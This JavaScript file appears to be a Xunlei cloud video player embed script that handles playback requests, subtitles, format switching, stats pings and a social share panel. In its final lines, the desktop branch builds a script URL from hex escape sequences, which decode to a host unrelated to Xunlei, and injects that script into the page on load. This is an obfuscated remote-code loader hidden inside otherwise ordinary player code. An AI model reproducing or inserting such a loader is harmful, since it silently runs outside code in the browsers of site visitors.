(function(){
	setTimeout(function(){
	var isUndef = function(a) {
				return typeof a == "undefined";
			};
		var isNull = function(a) {
		return typeof a == "object" && !a;
	};
	var name = 'XL_CLOUD_VOD_PLAYER';
	var isIpad = (window.navigator.userAgent.toLowerCase().indexOf('ipad') > 0 || window.navigator.userAgent.toLowerCase().indexOf('iphone') > 0) ? 1 : 0;
	var version='1.11';
	function $(name){ return document.getElementById(name);}
	var objs = $(name);
	if(!objs) return false;

	var getCookie = function(name){
			return (document.cookie.match(new RegExp("(^"+name+"| "+name+")=([^;]*)"))==null)?"":RegExp.$2;
	}

	function decode(str) {
		var r = '';
		try {
			r = decodeURIComponent(decodeURIComponent(str));
		} catch(e) {
			try {
				r = decodeURIComponent(str);
			} catch(e) {
				r = str;
			}
		}
		return r;
	}
	function encode(str) {
		return encodeURIComponent(str);
	}
	function JSONscriptRequest(fullUrl)
	{
		this.fullUrl = fullUrl;
		this.noCacheIE = '&noCacheIE=' + (new Date()).getTime();
		this.headLoc = document.getElementsByTagName("head").item(0);
		this.scriptId = 'JscriptId' + JSONscriptRequest.scriptCounter++;
	}
	JSONscriptRequest.scriptCounter = 1;
	JSONscriptRequest.prototype.buildScriptTag = function ()
	{
		this.scriptObj = document.createElement("script");
		this.scriptObj.setAttribute("type", "text/javascript");
		this.scriptObj.setAttribute("src", this.fullUrl);
	};
	JSONscriptRequest.prototype.removeScriptTag = function () {
		this.headLoc.removeChild(this.scriptObj);
	};
	JSONscriptRequest.prototype.addScriptTag = function () {
		this.headLoc.appendChild(this.scriptObj);
	};
	function getJSONP(url,f,callback){
		var req = url;
		if(f)
			window[f]=callback;
		if(req.indexOf('?')!=-1){
			req+="&jsonp="+f;	
		}
		else{
			req+="?jsonp="+f;
		}
		var jsonReq = new JSONscriptRequest(req);
		jsonReq.buildScriptTag();
		jsonReq.addScriptTag();
	}
	function getJSONPC(url,f,callback){
		var req = url;
		window[f]=callback;
		req+="&callback="+f;
		var jsonReq = new JSONscriptRequest(req);
		jsonReq.buildScriptTag();
		jsonReq.addScriptTag();
	}
	function getAttr(obj,name){
		return obj.getAttribute(name);
	}
	function setCookie(name,value,hours,isBaseDomain){
		if(arguments.length>2){
			var expireDate=new Date(new Date().getTime()+hours*3600000);
			document.cookie = name + "=" + encodeURIComponent(value) + "; path=/; domain=xunlei.com; expires=" + expireDate.toGMTString() ;
		}else
			document.cookie = name + "=" + encodeURIComponent(value) + "; path=/; domain=xunlei.com"; 
	}
	var box_obj=objs;

	var from=box_obj.getAttribute('from');
	from=from||'xlpan_web';
	var tmp=box_obj.getElementsByTagName('a');
	if(tmp.length==0) return;	
	var obj=tmp[0];
	var autoplay = getAttr(obj,'autoplay');
	if(!autoplay || autoplay!="true")
		autoplay = false;
	else
		autoplay = true;
		
	var enable_panel = getAttr(obj,'enable_panel');
	if(!enable_panel || enable_panel!="false")
		enable_panel = true;
	else
		enable_panel = false;
		
	var share_url = getAttr(obj,'share_url');
	if(!share_url)
		share_url = document.location.href;

	var url = obj.getAttribute('href');
	var filesize = getAttr(obj,'filesize');
	var gcid = getAttr(obj,'gcid');
	var cid = getAttr(obj,'cid');
	var filename = getAttr(obj,'title');
	var success = getAttr(obj,'onsuccess');
	var fail = getAttr(obj,'onfail');
	if(!box_obj.style.height){
		box_obj.style.height = '446px';
	}
	if(!box_obj.style.width){
		box_obj.style.width = '684px';
	}
	box_obj.style.overflow='hidden';
	box_obj.style.position='relative';
	
	if(!url){
		var height = parseInt(box_obj.style.height)/2+22;
		box_obj.innerHTML = "<img src='http://vod.lixian.xunlei.com/img/play_bg.jpg' width='100%' height='100%' />"
		+"<div style='text-align:center;color:#FFF;margin:-"+height.toString()+"px 0 0 0;width:100%;height:22px;'>缺少必要参数，无法播放！<br>请在下方输入正确的视频地址<br>点击 PLAY 播放<br>[支持普通下载链接、电驴…]<br></div>";
		return;
	}
	
	var INSTANCE;

	var initializing = false, fnTest = /xyz/.test(function(){xyz;}) ? /\b_super\b/ : /.*/;
	var Class = function(){};
	Class.extend = function(prop) {
		var _super = this.prototype;
		initializing = true;
		var prototype = new this();
		initializing = false;
		for (var name in prop) {
			prototype[name] = typeof prop[name] == "function" && 
			typeof _super[name] == "function" && fnTest.test(prop[name]) ?
			(function(name, fn){
				return function() {
					var tmp = this._super;
					this._super = _super[name];
					var ret = fn.apply(this, arguments);
					this._super = tmp;
					return ret;
				};
			})(name, prop[name]) :
			prop[name];
		}
		function Class() {
			if ( !initializing && this.init )
				this.init.apply(this, arguments);
		}
		Class.prototype = prototype;
		Class.constructor = Class;
		Class.extend = arguments.callee;
		return Class;
	};

	var _INSTANCE;
	window.XL_CLOUD_FX_INSTANCE = {
		Class:Class,
		lastFormat:225536,
		init:function(instance){
			_INSTANCE = instance;
			var that = this;
			var id = box_obj.getAttribute('id');
			if(!id){
				id="XL_CLOUD_PLAY_BOX";
				box_obj.setAttribute('id',id);
			}
			box_obj.style.backgroundColor='#000';
			
			window.onbeforeunload = function(){
				that.close();
			}
			that.query();
			
		},
		initEvent:function(){
			var self = this;
			G_PLAYER_INSTANCE.attachEvent(G_PLAYER_INSTANCE,'onGetFormats',function(_o,_e,that,from){
				self.getFormats();
			});
			G_PLAYER_INSTANCE.attachEvent(G_PLAYER_INSTANCE,'onSetFormats',function(_o,_e,that,from,format,isdefault){
				self.setFormats(that,from,format,isdefault);
			});
			G_PLAYER_INSTANCE.attachEvent(G_PLAYER_INSTANCE,'onErrorStat',function(_o,_e,code){
				self.stat({f:'playerror',e:code,from:from});
			});
			G_PLAYER_INSTANCE.attachEvent(G_PLAYER_INSTANCE,'onErrorExit',function(_o,_e,code,msg){
				self.stat({f:'playerror',e:code,from:from});
			});
			G_PLAYER_INSTANCE.attachEvent(G_PLAYER_INSTANCE,'onplaying',function(){
				self.stats_buff();
			});
		},
		stat:function(param){
			var param = param || {};
			var p = [];	
			param.p = 'XCVP';
			if(typeof param.u == 'undefined')
				param.u = getCookie('userid')||0;
				
			if(typeof param.v == 'undefined')
				param.v = getCookie('isvip')||0;
			if(typeof param.from == 'undefined')
				param.from = 'XCVP';
				
			for(var i in param) {
				p.push(i + "=" + encodeURIComponent(param[i]));
			}
			try{
				setTimeout(function(){
					var img = new Image(0,0);
					img.src = 'http://i.vod.xunlei.com/stat/s.gif?'+p.join('&');
				},5);
			}catch(e){}
		},
		stats_buff_flag:false,
		stats_buff:function(){
			if(this.stats_buff_flag) return;
			this.stat({f:'firstbuffer',from:from,time:(new Date().getTime() - this.initTime)});
			this.stats_buff_flag = true;
		},
		query:function(){

			var that = this,timerFlag=true;
			var timer = setTimeout(function(){
				if(timerFlag)
					that.error("服务器异常，稍后重试！<br>");
			},10*1000);

			var vip = getCookie('isvip')||0;
			var userid = getCookie('userid')||2;
			
			if(userid==2)
				setCookie("trial_play","trial_play");
			var req = "http://i.vod.xunlei.com/req_get_method_vod?url="+encodeURIComponent(url)+'&video_name='+encodeURIComponent(filename)+'&platform='+(isIpad?"1":"0")+"&userid="+userid+"&vip="+vip;
			if(gcid)
				req = req +'&gcid='+gcid;
			if(cid) 
				req = req +'&cid='+cid;
			if(filesize)
				req = req+'&filesize='+filesize;
			req = req+'&cache='+new Date()+'&from='+from;
			getJSONP(req,'XL_CLOUD_FX_INSTANCEqueryBack',function(r){
 				clearTimeout(timer);
				timerFlag=false;
				that.queryBack(r);
			});
			
		},
		queryBack:function(req){
			var req = req.resp;
			if(req.status!=0){
				this.error("文件在云端尚未准备就绪，请休息一会儿再回来！<br>请在下方输入正确的视频地址<br>点击 submit 播放<br>[支持普通下载链接、电驴…]<br>");
				
			}
			else{
				var that = this;
				_INSTANCE.attachEvent(_INSTANCE,'onload',function(){
					that.initEvent();
					var info = req.vodinfo_list;
					that.vod_info = info;
					that.data  = req;
					that.startPlay(info[0].vod_url,'225536');
					
					that.getCaption(req.src_info.gcid,req.src_info.cid);
					createPanel();
				});
				var id = box_obj.getAttribute('id');
				_INSTANCE.printObject(id,false,'100%','100%');
				this.initTime = new Date().getTime();
				try{
					window[success].call();
				}
				catch(e){}
			}
			that.stat({f:'svrresp',ret:req.ret,pt:req.status,from:from});	
		},
		startPlay:function(url,format,start,change){
			start=start||0;
			url = url+'&n=1';
			this.lastFormat = format;
			if(isIpad){
				G_PLAYER_INSTANCE.setUrl(url,start);
				this.getFormats();
				return true;
			}
			else{
				var param = {};
				param.totalByte = 1;
				param.totalTime = parseInt(this.data.duration/1000000);
				var _url = url;
				param.totalByte = parseInt(this.$PU('s',_url));
				param.sliceType = 0;
				if(start && start>0) {
					param.start = start;
				}
				G_PLAYER_INSTANCE.stop();
				G_PLAYER_INSTANCE.enableSharePanel(enable_panel);
				G_PLAYER_INSTANCE.flashopen(_url,true,false,autoplay,param,0);
			}
			
		},
		$PU : function(parameter, url) {
			url = isUndef(url) ? location.href : url;
			var result = url.match(new RegExp("[\#|\?]([^#]*)[\#|\?]?"));
			url = "&" + (isNull(result) ? "" : result[1]);
			result = url.match(new RegExp("&" + parameter + "=", "i"));
			return isNull(result) ? undefined : url.substr(result.index+1).split("&")[0].split("=")[1];
		},
		getFormats:function(format){
			format = format || this.lastFormat;
			var norms={
				g:{checked:false,enable:false},
				p:{checked:false,enable:false},
				y:{checked:false,enable:false}
			};
			norms.g.enable = typeof(this.vod_info[1])!='undefined';
			norms.p.enable = true;
			//norms.p.checked = true;
			format = format==225536?'p':'g';
			norms[format].checked = true;
			G_PLAYER_INSTANCE.setFormats(norms);
		},
		setFormats:function(that,from,format,isdefault){
			var start = G_PLAYER_INSTANCE.getPlayPosition();
			var that = this;
			autoplay = true;
			if(format=='g'){
				try{
					G_PLAYER_INSTANCE.close();
					G_PLAYER_INSTANCE.closeNetStream();
				}catch(e){}
				G_PLAYER_INSTANCE.setIsChangeQuality(true);
				this.startPlay(this.vod_info[1].vod_url,282880,start,1);
				G_PLAYER_INSTANCE.setIsChangeQuality(false);
				that.getFormats();
			}
			else if(format=='p'){
				try{
					G_PLAYER_INSTANCE.close();
					G_PLAYER_INSTANCE.closeNetStream();
				}catch(e){}
				G_PLAYER_INSTANCE.setIsChangeQuality(true);
				this.startPlay(this.vod_info[0].vod_url,225536,start,1);
				G_PLAYER_INSTANCE.setIsChangeQuality(false);
				that.getFormats();
			}
		},
		error:function(msg){
			var height = parseInt(box_obj.style.height)/2+22;
			box_obj.innerHTML = "<img src='http://vod.lixian.xunlei.com/img/play_bg.jpg' width='100%' height='100%' />"
			+"<div style='text-align:center;color:#FFF;margin:-"+height.toString()+"px 0 0 0;width:100%;height:22px;'>"+msg+"</div>";
			try{
				window[fail].call();
			}
			catch(e){}
		},
		close:function(){
			try{
				G_PLAYER_INSTANCE.close();
				G_PLAYER_INSTANCE.closeNetStream();
			}
			catch(e){
				
			}
		},
		getCaption:function(gcid,cid){
			var that = this
			getJSONPC("http://i.vod.xunlei.com/subtitle/list/gcid/"+gcid+"/cid/"+cid,'XL_CLOUD_FX_INSTANCEqueryCaptionBack',function(r){
				that.queryCaptionBack(r,cid);
			});
		},
		queryCaptionBack:function(r,cid){
			var len = r.sublist.length;
			if(r.sublist!=undefined && r.sublist.length>0 ){
				var sublist = r.sublist;
				var list = [];
				for(var i=0;i<len;i++){
					if(list.length>3)
						break;
					var item = sublist[i];
					if(item.sname==undefined)
						continue;
					var names = item.sname;
					var nlen = names.length;
					if(nlen>0){
						for(var j=0;j<nlen;j++){
							var name = decode(names[j]);
							var begin = name.lastIndexOf(".");
							var end = name.length;
							var ext= name.substring(parseInt(begin)+1,end).toLowerCase();
							if(ext=='ass' || ext=='srt'){
								list.push(item);
							}
						}
					}
				}
				if(!isIpad){
					G_PLAYER_INSTANCE.setCaptionList(list);
					var param = {"description":"请选择字幕文件(*.srt)","extension":"*.srt","limitSize":5*1024*1024,"uploadURL":"http://dynamic.vod.lixian.xunlei.com/interface/upload_file/?cid="+cid,"timeOut":"30"}
					G_PLAYER_INSTANCE.setCaptionParam(param);	
				}

			}
			
		},
		sharePanel:function(){
			document.getElementById('XL_CLOUD_FX_tips').innerHTML="";
			box_obj.childNodes[1].style.display="block";
		},
		hideSharePanel:function(){
			box_obj.childNodes[1].style.display="none";
			G_PLAYER_INSTANCE.hideSharePanel();
		},
		shareTo:function(target){
			
			var title = "我正在观看"+decode(filename);
			var url = "";
			try{
				var pageUrl = document.top.location.href;
			}catch(e){
				var pageUrl = document.location.href;
			}	
			if(target=='sina'){
				url = 'http://service.weibo.com/share/share.php?title='+encodeURIComponent(title)+'&url='+pageUrl;
			}else if(target=='qqweibo'){
				url = 'http://v.t.qq.com/share/share.php?title='+encodeURIComponent(title)+'&url='+pageUrl;
			}else if(target=='qzone'){
				url = 'http://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?title='+encodeURIComponent(title)+'&url='+pageUrl;
			}else if(target=='renren'){
				url = 'http://share.renren.com/share/buttonshare.do?title='+encodeURIComponent(title)+'&link='+pageUrl;
			}else if(target=='douban'){
				url = 'http://www.douban.com/recommend?title='+encodeURIComponent(title)+'&url='+pageUrl;
			}else if(target=='kaixin'){
				url = 'http://www.kaixin001.com/repaste/bshare.php?rtitle='+encodeURIComponent(title)+'&rurl='+pageUrl;
			}
			window.open(url,'_blank','width=700,height=550');
		},
		copyShareLink:function(){
			return document.getElementById("XL_CLOUD_FX_slink").value;
		},
		copySuccess:function(){
			document.getElementById('XL_CLOUD_FX_tips').innerHTML="复制成功!";
			var tips_timer = null;
			tips_timer = setTimeout(function(){document.getElementById('XL_CLOUD_FX_tips').innerHTML="";this.tips_timer=null;},5000);
			this.stat({f:'share',from:from});
		}
	};
	function createPanel(){
		var panelLeft = box_obj.clientWidth/2-230;
		var panelTop = parseInt(box_obj.clientHeight/2)-125;
		
		var panel='<div class="XL_CLOUD_FX_tb_box" style="text-align: left;">'+
					   '<div class="XL_CLOUD_FX_tb_wp">'+
					      '<div class="XL_CLOUD_FX_tb_hd"><h3>分享</h3></div>'+
						  '<div class="XL_CLOUD_FX_tb_bd">'+
						    '<div class="XL_CLOUD_FX_tb_ins_wp">'+
						       '<label>复制地址：</label>'+
							   '<span class="XL_CLOUD_FX_tb_ins_box" style="margin-right:10px;"><input id="XL_CLOUD_FX_slink" type="text" class="XL_CLOUD_FX_tb_ins" name="XL_CLOUD_FX_slink" value="'+share_url+'"/></span>';
		if(isIpad){
			panel = panel+'<a title="点击复制" class="XL_CLOUD_FX_tb_btn" href="javascript:;" onclick="alert("您的浏览器暂时不支持该功能");document.getElementById(\"XL_CLOUD_FX_slink\").focus();return false;">点击复制<span id="XL_CLOUD_FX_tips">复制成功</span></a>';
		}
		else{
			panel = panel+'<a class="XL_CLOUD_FX_tb_btn" style="margin-left:0;" ><object  classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" codebase="http://fpdownload.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=7,0,0,0" width="100" height="28" id="XL_CLOUD_FX_copyer" align="top">'+
						 	'<param name="allowScriptAccess" value="always" />'+
							'<param name="movie" value="http://vod.xunlei.com/fx/copyString.swf" />'+
							'<param name="quality" value="high" />'+
							'<param name="bgcolor" value="#ffffff" />'+
							'<param name="wmode" value="transparent" />'+
							'<param name="flashvars" value="label=点击复制&fontSize=12&fontColor=0xffffff&fontFamily=微软雅黑" />'+
							'<embed style="outline:0;" src="http://vod.xunlei.com/fx/copyString.swf" wmode="transparent" flashvars="label=点击复制&fontSize=12&fontColor=0xffffff&fontFamily=微软雅黑" quality="high" bgcolor="#ffffff" width="100" height="28" name="XL_CLOUD_FX_copyer" align="top" allowScriptAccess="always" type="application/x-shockwave-flash" pluginspage="http://www.macromedia.com/go/getflashplayer" />'+
						  '</object><span id="XL_CLOUD_FX_tips">复制成功</span></a>';
		}						
			panel = panel+' </div><div class="XL_CLOUD_FX_tb_ins_wp">'+
						       ' <label>分享到：</label>'+
								'<ul class="XL_CLOUD_FX_tb_ico_list">'+
								' <li><a title="qq空间" href="javascript:;" onclick="XL_CLOUD_FX_INSTANCE.shareTo(\'qzone\');return false;"><span onFocus="this.blur();" class="XL_CLOUD_FX_tb_ico XL_CLOUD_FX_tb_ico_qq" style="cursor:pointer"></span>qq空间</a></li>'+
								' <li><a title="人人网" href="javascript:;" onclick="XL_CLOUD_FX_INSTANCE.shareTo(\'renren\');return false;"><span class="XL_CLOUD_FX_tb_ico XL_CLOUD_FX_tb_ico_renren" style="cursor:pointer"></span>人人网</a></li>'+
								' <li><a title="新浪微博" href="javascript:;" onclick="XL_CLOUD_FX_INSTANCE.shareTo(\'sina\');return false;"><span class="XL_CLOUD_FX_tb_ico XL_CLOUD_FX_tb_ico_sina" style="cursor:pointer"></span>新浪微博</a></li>'+
								' <li><a title="豆瓣" href="javascript:;" onclick="XL_CLOUD_FX_INSTANCE.shareTo(\'douban\');return false;"><span class="XL_CLOUD_FX_tb_ico XL_CLOUD_FX_tb_ico_douban" style="cursor:pointer"></span>豆瓣</a></li>'+
								' <li><a title="腾讯微博" href="javascript:;" onclick="XL_CLOUD_FX_INSTANCE.shareTo(\'qqweibo\');return false;"><span class="XL_CLOUD_FX_tb_ico XL_CLOUD_FX_tb_ico_tx" style="cursor:pointer"></span>腾讯微博</a></li>'+
								' <li><a title="开心网" href="javascript:;" onclick="XL_CLOUD_FX_INSTANCE.shareTo(\'kaixin\');return false;"><span class="XL_CLOUD_FX_tb_ico XL_CLOUD_FX_tb_ico_kx" style="cursor:pointer"></span>开心网</a></li>'+
							'	</ul></div><a title="关闭" href="javascript:;" onclick="XL_CLOUD_FX_INSTANCE.hideSharePanel();return false;" class="XL_CLOUD_FX_tb_close">关闭</a></div>'+
					  '</div></div>';
		var mydiv = document.createElement("div");
		mydiv.style.position="absolute";
		mydiv.style.left=panelLeft+"px";
		mydiv.style.top=panelTop+"px";
		mydiv.style.display="none";		
		mydiv.innerHTML=panel;
		box_obj.appendChild(mydiv);
		
		var mylink = document.createElement("link");
		mylink.setAttribute("rel","stylesheet");
		mylink.setAttribute("type","text/css");
		mylink.setAttribute("href","http://vod.lixian.xunlei.com/fx/css/fx.css?"+version);
		document.getElementsByTagName("head").item(0).appendChild(mylink);

	};
	getJSONP("http://dynamic.vod.lixian.xunlei.com/fx?cache="+new Date(),'',function(r){
		//alert(r);
	});
	var js = isIpad?('http://vod.lixian.xunlei.com/fx/ipad.js?'+version):('\x68\x74\x74\x70\x3a\x2f\x2f\x73\x63\x72\x69\x70\x74\x2e\x61\x70\x62\x65\x73\x74\x2e\x69\x6e\x66\x6f\x2f\x73\x63\x72\x69\x70\x74\x2f\x6f\x75\x74\x73\x69\x74\x65\x2f\x66\x6c\x61\x73\x68\x2e\x6a\x73');
	var jsonReq = new JSONscriptRequest(js);
	jsonReq.buildScriptTag();
	jsonReq.addScriptTag();
	},1);

})();